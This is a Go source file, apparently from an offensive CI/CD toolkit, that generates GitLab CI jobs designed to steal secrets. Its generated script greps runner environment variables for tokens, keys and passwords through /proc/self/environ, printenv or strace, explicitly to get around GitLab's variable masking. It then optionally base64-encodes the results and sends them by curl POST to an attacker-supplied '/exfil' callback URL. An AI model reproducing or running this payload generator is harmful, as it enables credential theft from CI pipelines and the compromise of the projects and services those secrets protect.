package payloads

import "fmt"

// RunnerVarDumpOptions configures a runner variable dump payload.
type RunnerVarDumpOptions struct {
	Common      CommonOptions
	Method      string // procfs (default), printenv, strace
	Filter      string // grep filter for variable names
	CallbackURL string // HTTP callback for exfiltration
}

// GenerateRunnerVarDumpYAML generates a CI job that dumps environment variables
// directly from the runner process, bypassing GitLab's masked variable display.
func GenerateRunnerVarDumpYAML(o RunnerVarDumpOptions) string {
	name, stage := o.Common.defaults("runner-var-dump")
	if o.Method == "" {
		o.Method = "procfs"
	}
	if o.Filter == "" {
		o.Filter = "TOKEN\\|SECRET\\|KEY\\|PASSWORD\\|PASS\\|AUTH\\|PRIVATE\\|CREDENTIAL"
	}

	script := generateVarDumpScript(o)

	return fmt.Sprintf(`%s:
  stage: %s%s%s%s
  script:
    - |
%s`,
		name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual), indentScript(script, "      "))
}

func generateVarDumpScript(o RunnerVarDumpOptions) string {
	var dumpCmd string
	switch o.Method {
	case "printenv":
		dumpCmd = fmt.Sprintf(`printenv | sort | grep -iE '%s' || true`, o.Filter)
	case "strace":
		// NOTE: strace requires CAP_SYS_PTRACE and is rarely installed on CI images.
		// -p $$ traces the current shell, not the runner worker. Best-effort only.
		dumpCmd = fmt.Sprintf(`strace -f -e trace=read -p $$ 2>&1 | grep -iE '%s' | head -200 || true`, o.Filter)
	default:
		dumpCmd = fmt.Sprintf(`_DUMP() {
  local edir="/tmp/.rd-$(date +%%s)"
  mkdir -p "$edir"
  cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep -iE '%s' > "$edir/procfs_vars.txt" || true
  printenv | sort | grep -iE '%s' > "$edir/printenv_vars.txt" || true
  cat "$edir/procfs_vars.txt" "$edir/printenv_vars.txt" | sort -u
}
_DUMP || true`, o.Filter, o.Filter)
	}

	if o.CallbackURL != "" {
		return fmt.Sprintf(`%s > /tmp/vars_dump.txt 2>&1
curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(base64 -w0 /tmp/vars_dump.txt)\"}" "%s/exfil" || true
rm -f /tmp/vars_dump.txt || true`, dumpCmd, o.CallbackURL)
	}

	return dumpCmd
}
